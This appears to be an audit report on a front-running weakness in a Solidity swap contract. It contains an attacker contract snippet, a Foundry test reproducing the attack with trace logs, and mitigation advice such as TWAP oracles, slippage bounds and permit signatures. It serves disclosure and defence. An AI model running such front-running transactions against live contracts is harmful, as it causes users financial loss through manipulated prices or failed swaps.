# Proof of Concept: Front-Running Vulnerability in Swap Contract

## Description
The swapETHForTokens function in the Swap contract is vulnerable to front-running. An attacker can observe a user’s pending swap in the mempool and submit a small swap with higher gas, altering tokenBalance and ethBalance. This increases the price (fewer tokens per ETH), causing the user’s swap to fail or yield fewer tokens.

## Impact
- *Severity*: High
- *Effect*: Users receive fewer tokens than expected or their swap fails, leading to financial loss or denied access to tokens.

## Likelihood
- *Probability*: High
- *Reason*: Ethereum’s public mempool allows attackers to monitor and front-run large swaps.

## Proof of Concept
1. *Setup*: Deploy Swap with tokenBalance = 10000 * 10^18, ethBalance = 100 ether.
2. *Attack Steps*:
   - User submits a 10 ETH swap, expecting ~1000 * 10^18 tokens.
   - Attacker front-runs with a 0.1 ETH swap, reducing tokenBalance and increasing ethBalance.
   - User’s swap fails due to minTokens or receives fewer tokens.
3. *Code Snippet*:
   ```solidity
   function attack(address swapAddr) external payable {
       Swap(swapAddr).swapETHForTokens{value: 0.1 ether}(0);
   }
4. *TEST CASE*:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Swap} from "../src/Swap.sol";

contract SwapTest is Test {
    Swap public swap;
    address user = makeAddr("userA");
    address attacker = makeAddr("userB");

    function setUp() public {
        swap = new Swap();
        vm.deal(user, 10 ether); // Give userA 10 ETH
        vm.deal(attacker, 10 ether); // Give userB 10 ETH
    }

    function testFrontrunningCausesSlippage() public {
        uint amountToSwap = 1 ether;
        uint expectedTokensBefore = (amountToSwap * swap.tokenBalance()) /
            swap.ethBalance();
        vm.prank(attacker);
        swap.swapETHForTokens{value: 0.1 ether}(0);

        vm.startPrank(user);
        vm.expectRevert("Insufficient tokens received");
        swap.swapETHForTokens{value: amountToSwap}(expectedTokensBefore);
        vm.stopPrank();
    }
}
```
5. *TRACE LOGS*:
```solidity
Ran 1 test for test/Swap.t.sol:SwapTest
[PASS] testFrontrunningCausesSlippage() (gas: 43896)
Traces:
  [43896] SwapTest::testFrontrunningCausesSlippage()
    ├─ [2425] Swap::ethBalance() [staticcall]
    │   └─ ← [Return] 100000000000000000000 [1e20]
    ├─ [2446] Swap::tokenBalance() [staticcall]
    │   └─ ← [Return] 10000000000000000000000 [1e22]
    ├─ [0] VM::prank(userB: [0xc150499dda64693c6b39dBE263D8F2Df391Db71B])
    │   └─ ← [Return] 
    ├─ [7583] Swap::swapETHForTokens{value: 100000000000000000}(0)
    │   └─ ← [Stop] 
    ├─ [0] VM::startPrank(userA: [0xCe6c11dDc81C10B05678dA2DA034ebD0E5414107])
    │   └─ ← [Return] 
    ├─ [0] VM::expectRevert(custom error 0xf28dceb3:  Insufficient tokens received)
    │   └─ ← [Return] 
    ├─ [1318] Swap::swapETHForTokens{value: 1000000000000000000}(100000000000000000000 [1e20])
    │   └─ ← [Revert] revert: Insufficient tokens received
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    └─ ← [Stop] 

```
# Mitigation: Protect Against Frontrunning via Slippage Tolerance Enforcement
*Problem Summary*
The current implementation of swapETHForTokens(uint256 minTokens) is vulnerable to frontrunning attacks due to its reliance on a dynamic pricing formula that uses internal state (tokenBalance and ethBalance). A malicious actor can observe a high-value transaction in the mempool and front-run it with a small transaction that distorts the exchange rate, causing the original transaction to fail or execute at a less favorable rate. This is known as a price manipulation frontrunning attack.

*Recommended Mitigation Strategy*
1. Time-Weighted Average Pricing (TWAP) or Oracle Integration
Why: Prevent manipulation of spot prices by averaging over a period of time.

Implement a pricing mechanism that decouples swap pricing from the immediate internal state of the contract. Use a time-weighted average price (TWAP) sourced from a trusted oracle (e.g., Chainlink, Uniswap TWAP) to determine the ETH/token rate. This reduces the impact of single-block manipulations.
```solidity
// Pseudocode concept
function getTokenPrice() external view returns (uint256) {
    return priceOracle.getTWAP(); // Average over last N blocks
}
```
2. Bounded Slippage Enforcement (Caller-Specified minTokens)
Why: Ensure swaps do not execute below user’s acceptable rate.

You're already requiring minTokens, but this protection only works if users specify realistic values. Educate users (or implement UI/SDK-side helpers) to calculate and pass minTokens based on:

Expected price

Acceptable slippage buffer (e.g., 0.5%–1%)

Example:
```solidity
uint expectedTokens = (msg.value * tokenBalance) / ethBalance;
uint minTokens = expectedTokens * 995 / 1000; // Allow 0.5% slippage
swapETHForTokens(minTokens);
```
Note: This must be enforced off-chain by the caller or frontend.

3. Use Reentrancy Guards and Access Control if Applicable
Why: Prevent more advanced multi-call manipulation.

Even though not directly related to frontrunning, enabling a nonReentrant modifier and proper access control helps reduce complex multi-transaction or sandwich attack vectors in generalized swap systems.

4. Atomicity via Off-Chain Quoting + Permit Signatures
Why: Reduce delay between rate quote and execution.

Introduce off-chain quoting combined with EIP-2612-style signed approvals or EIP-712 permit-style meta-transactions. This ensures that the rate at which a user agrees to swap is used exactly in the transaction, preventing front-running during the quote-execution delay.

5. Add a Cooldown or Block Delay Between Swaps (Optional)
Why: Discourage back-to-back arbitrage or flash attacks.

For low-liquidity pools, consider enforcing a minimum block delay or time-based throttle between consecutive swaps, especially by different users. This reduces the chance of back-running.

```solidity
mapping(address => uint256) public lastSwapBlock;

function swapETHForTokens(uint256 minTokens) external payable {
    require(block.number > lastSwapBlock[msg.sender] + 1, "Wait before next swap");
    lastSwapBlock[msg.sender] = block.number;
    ...
}
```
